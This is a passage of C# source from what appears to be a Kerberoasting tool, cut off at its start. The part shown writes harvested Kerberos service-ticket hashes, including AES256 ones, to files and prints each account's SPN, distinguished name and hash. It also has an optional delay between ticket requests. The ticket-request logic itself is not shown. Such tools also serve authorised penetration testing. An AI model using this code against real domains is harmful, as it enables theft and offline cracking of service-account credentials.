                                                File.AppendAllText(Path.GetFullPath(targetFile), hashFormat + Environment.NewLine);
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                            WriteWarning($"Error writing to file '{targetFile}': {ex.Message}");
                                            continue;
                                        }
                                    }

                                    WriteInfo($"SAM               : {samAccountName}");
                                    WriteInfo($"DN                : {distinguishedName}");
                                    WriteInfo($"SPN               : {spn}");
                                    WriteInfo($"PwdLastSet        : {pwdLastSet}");
                                    WriteInfo($"Supported ETypes  : {supportedETypes}");
                                    WriteInfo($"Hash              : {hashFormat}\n");
                                }
                                else
                                {
                                    WriteWarning($"No match for SPN: {spn}");
                                }
                            }
                            catch (Exception ex)
                            {
                                WriteWarning($"Failed to request ticket for {spn}: {ex.Message}");
                            }

                            if (delaySeconds > 0)
                            {
                                for (int i = delaySeconds; i > 0; i--)
                                {
                                    Console.Write($"\rDelaying {i} seconds...   ");
                                    Thread.Sleep(1000);
                                }
                                Console.WriteLine();
                            }
                        }
                    }
                }

                if (!string.IsNullOrEmpty(outputFile))
                {
                    string fullOutputPath = Path.GetFullPath(outputFile);
                    WriteInfo($"Hashes saved to the file: {fullOutputPath}");
                    string aesFile = Path.Combine(Path.GetDirectoryName(fullOutputPath), $"18-{Path.GetFileNameWithoutExtension(fullOutputPath)}{Path.GetExtension(fullOutputPath)}");
                    if (File.Exists(aesFile))
                    {
                        WriteInfo($"AES256 hashes saved to the file: {aesFile}");
                    }
                }
            }
            catch (Exception ex)
            {
                WriteWarning($"Error: Unable to contact the specified domain or domain controller: {ex.Message}");
                Environment.Exit(1);
            }
        }
    }
}